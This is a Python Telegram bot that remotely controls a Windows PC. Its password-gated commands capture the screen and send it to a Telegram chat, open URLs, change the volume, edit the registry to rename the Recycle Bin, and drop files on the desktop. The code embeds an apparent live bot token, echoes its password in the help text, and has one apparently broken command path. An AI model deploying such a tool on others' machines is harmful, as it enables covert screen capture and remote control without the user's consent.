import telebot
import os
import winreg
import pyautogui
import webbrowser
from pynput.keyboard import Key,Controller
keyboard = Controller()
import time


class Bot:
    def __init__(self, bot=telebot.TeleBot('6941701570:AAHp7l4D4edCVHvh7-UdDKT5mD5rZXnQ54s')):
        self.bot = bot
        self.trash = '645FF040-5081-101B-9F08-00AA002F954E'
        self.way = os.path.join(os.environ["USERPROFILE"])
        if 'par' in os.listdir(self.way):
            f = open(f'{self.way}\\par', 'r')
            self.code = f.read()
            f.close()
        else:
            self.code = '4321'
            f = open(f'{self.way}\\par', 'w')
            f.write(self.code)
            f.close()

    def refresh(self):
        pyautogui.keyDown('win')
        pyautogui.press('d')
        pyautogui.keyUp('win')
        pyautogui.press('f5')
        pyautogui.keyDown('win')
        pyautogui.press('d')
        pyautogui.keyUp('win')

    def screen(self, message):
        dir_name = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Pictures")
        pyautogui.screenshot(f'{dir_name}\\screen.png')
        bot.send_photo(message.chat.id, open(os.path.join(dir_name, 'screen.png'), 'rb'))
        os.remove(os.path.join(dir_name, 'screen.png'))
        return True

    def sound(self, arg):
        arg = int(arg)
        for i in range(abs(arg) // 2):
            if arg < 0:
                keyboard.press(Key.media_volume_down)
                time.sleep(0.01)
            else:
                keyboard.press(Key.media_volume_up)
                time.sleep(0.01)
        return True

    def rename(self, name, arg=0):
        location = winreg.HKEY_CURRENT_USER
        soft = winreg.OpenKey(location, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\')

        key_1 = winreg.CreateKey(soft, '{645FF040-5081-101B-9F08-00AA002F954E}')
        winreg.SetValueEx(key_1, '', 0, winreg.REG_SZ, name)
        if arg == 0: self.refresh()
        else: pyautogui.press('f5')

    def file(self, message):
        fileID = message.photo[-1].file_id
        file_info = bot.get_file(fileID)
        downloaded_file = bot.download_file(file_info.file_path)
        dir_name = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop")
        with open(os.path.join(dir_name, f'{len(downloaded_file)}.jpg'), 'wb') as new_file:
            new_file.write(downloaded_file)
        return True

    def webbrowser(self, arg):
        webbrowser.open(arg)
        return True

    def command(self, command, message):
        command = f'{command}'
        command = command.split('==')
        command[1] = command[1].split('::')
        if command[0] != self.code: return False
        else:
            if command[1][0] == 'help':
                bot.send_message(message.chat.id, "1:переименовать мусорку когда не рабочий стол: rename_trash_nodfesk"
                                                  "\n 1.1:переименовать мусорку кокда открыт рабочий стол: rename_trash_desk"
                                                  "\n 2:создать текстовый файл на рабочем столе: creat_txt"
                                                  "\n 3:закрыть все: close_all"
                                                  f"\n 4:пароь: {self.code}"
                                                  "\n 5:отправь фото и оно сохранится на рабочий стол: *просто отправь фото*"
                                                  "\n 6:сменить пароль: repar"
                                                  "\n 7:снимок экрана: screen"
                                                  "\n 8:открыть ссылку: open_webbr"
                                                  "\n 9:изменить звук: sound")
                return True
            if command[1][0] == 'rename_trash_nodesk':
                self.rename(command[1][1], arg=0)
                return True
            if command[1][0] == 'rename_trash_desk':
                self.rename(command[1][1], arg=1)
                return True
            if command[1][0] == 'creat_txt':
                dir_name = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop")
                f = open(os.path.join(dir_name, f'{command[1][1]}.txt'), 'w')
                f.close()
                return True
            if command[1][0] == 'close_all':
                pyautogui.keyDown('win')
                pyautogui.press('d')
                pyautogui.keyUp('win')
                return True
            if command[1][0] == 'repar':
                f = open(f'{self.way}\\par', 'w')
                f.write(command[1][1])
                f.close()
                self.code = command[1][1]
                return True
            if command[1][0] == 'screen':
                return self.screen(message)
            if command[1][0] == 'open_webbr':
                return self.webbrowser(command[1][1])
            if command[1][0] == 'sound':
                return self.sound(command[1][1])

bot_bot = Bot()
bot = bot_bot.bot

@bot.message_handler(content_types=['text'])
def message_reply(message):
    if message.text != "%spec%":
        bot.send_message(message.chat.id, "connect")
        if bot_bot.command(message.text, message=message):
            bot.send_message(message.chat.id,"sucsess")
    else:
        bot_bot.command(f"{bot_bot.code}/help", message=message)

@bot.message_handler(content_types=['photo'])
def message_reply(message):
    bot.send_message(message.chat.id, "connect")
    if bot_bot.file(message=message):
        bot.send_message(message.chat.id,"sucsess")

bot.infinity_polling()